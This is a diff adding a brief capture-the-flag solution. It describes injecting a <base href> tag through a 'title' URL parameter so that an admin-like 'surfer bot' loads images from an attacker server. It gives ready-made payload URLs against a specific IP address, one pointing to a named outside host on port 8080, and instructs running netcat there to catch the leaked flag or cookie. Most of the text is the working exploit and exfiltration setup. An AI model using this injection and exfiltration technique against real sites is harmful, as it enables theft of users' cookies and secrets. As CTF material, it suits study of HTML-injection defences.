@@ -1,0 +1,10 @@
+This will insert a <base> tag as the first tag of the body which sets the
+base url for all image requests later on, for example the static/{flag}.gif path.
+
+http://45.76.92.221:8070/?title=%3C/title%3E%3C/head%3E%3Cbody%3E%3Cbase%20href=%22http://<your-server>.ch:8080/%22/%3E
+
+make sure to run netcat on port 8080 on your server to receive the flag.
+then let the surfer bot send you the cookie as part of the image file which he
+now requests on your server.
+
+http://45.76.92.221:8070/report?url=http%3A%2F%2F45.76.92.221%3A8070%2F%3Ftitle%3D%253C%2Ftitle%253E%253C%2Fhead%253E%253Cbody%253E%253Cbase%2520href%3D%2522http%3A%2F%2Fg%25C3%25BCssl.ch%3A8080%2F%2522%2F%253E
